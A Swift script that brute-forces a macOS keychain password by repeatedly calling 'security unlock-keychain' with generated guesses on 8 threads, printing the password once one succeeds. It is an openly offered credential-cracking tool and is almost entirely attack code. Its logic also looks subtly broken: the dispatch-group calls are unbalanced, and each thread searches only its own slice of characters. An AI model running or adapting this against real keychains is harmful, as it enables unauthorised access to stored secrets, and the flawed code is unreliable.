import Foundation
import Dispatch

func bruteKeychain(password: String) -> Bool {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: "/usr/bin/security")
    process.arguments = ["unlock-keychain", "-p", password, "/users/INSERT-USER-HERE/Library/Keychains/test.keychain"]

    let pipe = Pipe()
    process.standardError = pipe

    do {
        try process.run()
        process.waitUntilExit()

        let stderrData = pipe.fileHandleForReading.readDataToEndOfFile()
        return stderrData.isEmpty
    } catch {
        print("Error: \(error)")
        return false
    }
}

func brute(length: Int, startTime: TimeInterval) {
    let characters = "abcdefghijklm90!@".map { String($0) }

    let queue = DispatchQueue.global()
    let group = DispatchGroup()

    let numThreads = 8 // use 8 threads
    let threadWorkload = characters.count / numThreads // each thread will search for a sub-set of the characters

    for threadId in 0..<numThreads {
        let threadCharacters = Array(characters[threadId * threadWorkload..<(threadId + 1) * threadWorkload])
        group.enter()
        queue.async {
            func search(prefix: String, depth: Int) {
                if depth == 0 {
                    let result = bruteKeychain(password: prefix)
                    if result {
                        print("Password is: \(prefix)")
                        print("Time taken: \(Date().timeIntervalSince1970 - startTime)")
                        exit(0)
                    } else {
                        print("Password is not: \(prefix)")            
                    }
                    group.leave()
                } else {
                    for character in threadCharacters {
                        search(prefix: prefix + character, depth: depth - 1)
                    }
                }
            }

            search(prefix: "", depth: length)
        }
    }

    group.wait()
}

let startTime = Date().timeIntervalSince1970

for len in 0..<7 {
    brute(length: len, startTime: startTime)
    print(len)
}
